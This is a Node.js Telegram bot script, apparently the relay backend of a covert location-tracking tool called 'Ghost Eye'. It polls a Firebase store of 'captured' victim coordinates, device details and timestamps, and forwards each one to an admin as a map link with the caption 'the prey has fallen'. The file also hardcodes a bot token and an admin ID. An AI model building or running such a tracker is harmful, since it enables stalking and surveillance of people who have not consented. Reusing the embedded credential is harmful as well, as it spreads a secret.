const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = '8673435121:AAE3dl1MLPNc1V7lss4_ygeGmu5eZQXP0bQ';
const adminId = '7594678193';
const fbURL = "https://ghosteye-296b6-default-rtdb.firebaseio.com/captured_data.json";

const bot = new TelegramBot(token, {polling: true});

console.log("Ghost Eye боты іске қосылды... Бро, нысананы күтіп отырмын!");

setInterval(async () => {
    try {
        const res = await axios.get(fbURL);
        const data = res.data;
        if (data) {
            for (let id in data) {
                if (!data[id].reported) {
                    const mapLink = "https://www.google.com/maps?q=" + data[id].lat + "," + data[id].lng;
                    const msg = "🎯 ОЛЖА ТҮСТІ!\n\n📍 Карта: " + mapLink + "\n📱 Құрылғы: " + data[id].device + "\n⏰ Уақыт: " + data[id].time;
                    
                    bot.sendMessage(adminId, msg);
                    
                    // Қайталанбауы үшін "reported" деп белгілейміз
                    await axios.patch("https://ghosteye-296b6-default-rtdb.firebaseio.com/captured_data/" + id + ".json", {reported: true});
                }
            }
        }
    } catch (e) { }
}, 5000);

bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, "Ghost System Online. Команда күтілуде..."));
